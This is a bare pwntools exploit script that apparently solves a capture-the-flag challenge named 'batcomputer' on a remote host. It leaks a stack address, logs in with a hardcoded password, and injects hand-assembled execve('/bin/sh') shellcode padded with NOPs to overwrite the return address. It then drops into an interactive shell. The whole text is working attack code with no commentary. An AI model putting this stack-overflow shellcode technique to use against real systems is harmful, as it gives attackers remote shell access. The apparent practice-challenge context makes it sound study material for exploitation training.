#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./batcomputer',checksec=False)
context.arch = 'amd64'
#p = process()
p = remote('83.136.251.254',54712)
#gdb.attach(p,gdbscript='''
#           brva 0x00000000000012B2
#           brva 0x000000000000131F
           
#           ''')

p.sendline(b'1')
p.recvuntil(b'It was very hard, but Alfred managed to locate him: ')
leak = int(p.recvline()[:-1],16)

#shellcode = asm(shellcraft.sh())
shellcode = asm('''
                mov rax,29400045130965551
                push rax
                mov rdi,rsp
                xor rsi,rsi
                xor rdx,rdx
                mov rax,0x3b
                syscall
                ''')
payload = shellcode
payload = payload.ljust(0x54,b'\x90')
payload += p64(leak)

input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Enter the password: ',b'b4tp@$$w0rd!')
p.send(payload)
p.sendlineafter(b'> ',b'3')

p.interactive()
